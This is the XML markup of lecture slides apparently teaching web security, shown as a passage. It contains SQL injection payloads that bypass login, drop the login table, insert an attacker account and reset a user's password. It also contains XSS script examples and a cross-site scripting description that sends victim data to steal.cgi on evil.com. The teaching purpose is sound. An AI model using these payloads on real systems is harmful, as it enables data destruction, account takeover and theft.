                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t> OR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t> AND </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>     `pass`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t> OR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:latin typeface="Calisto MT" charset="0"/>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latin typeface="Calisto MT" charset="0"/>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latin typeface="Calisto MT" charset="0"/>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48</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4089457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latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>SELECT * FROM `login` WHERE `user`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>; DROP TABLE `login`; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t> AND </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>     `pass`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘’</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="553876"/>
              </a:solidFill>
              <a:latin typeface="Calisto MT" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A89CF254-E47E-2C44-98AF-85D52326CB77}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>49</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4089457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latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>SELECT * FROM `login` WHERE `user`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>; INSERT INTO `login` ('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>user','pass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>') VALUES ('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>haxor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>','whatever');</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t> AND `pass`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘’</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="553876"/>
              </a:solidFill>
              <a:latin typeface="Calisto MT" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A89CF254-E47E-2C44-98AF-85D52326CB77}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>50</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4089457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latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>SELECT * FROM `login` WHERE `user`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>; UPDATE `login` SET `pass`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>pass123</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t> WHERE `user`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>timbo317</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t> AND `pass`=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>‘’</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" dirty="0">
              <a:solidFill>
                <a:srgbClr val="553876"/>
              </a:solidFill>
              <a:latin typeface="Calisto MT" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="553876"/>
              </a:solidFill>
              <a:latin typeface="Calisto MT" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="553876"/>
                </a:solidFill>
                <a:latin typeface="Calisto MT" charset="0"/>
              </a:rPr>
              <a:t>All queries are possible!</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A89CF254-E47E-2C44-98AF-85D52326CB77}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>51</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4089457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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t> a demo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" baseline="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t>Alert(“Evil JavaScript”);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" baseline="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" baseline="0" dirty="0"/>
              <a:t>Demo 2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" baseline="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" baseline="0" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;script type="text/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>"&gt; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>     function </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>whichButton</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(event) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>			if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>event.button</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>==1) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>				alert("You clicked the left mouse button!") }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>			else {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>				alert("You clicked the right mouse button!") </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 			}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>		}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;body </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>onMouseDown</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>whichButton</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(event)"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/body&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A89CF254-E47E-2C44-98AF-85D52326CB77}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>57</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="196525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F254-E47E-2C44-98AF-85D52326CB77}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>68</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39997128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hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma"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200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333399"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>Interpreted as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="333399"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>Javascript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333399"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma"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200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333399"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>by victim</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333399"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>’</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333399"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>s browser; </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma"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200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333399"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>opens window and calls </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="0" hangingPunct="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma"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200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="333399"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>steal.cgi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333399"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t> on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="333399"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>evil.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" sz="1200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="333399"/>
              </a:solidFill>
              <a:latin typeface="Tahoma" charset="0"/>
            </a:endParaRPr>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70</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35700355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www.cnblogs.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hyddd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/archive/2009/04/09/1432744.html</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{A89CF254-E47E-2C44-98AF-85D52326CB77}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>71</a:t>
            </a:fld>
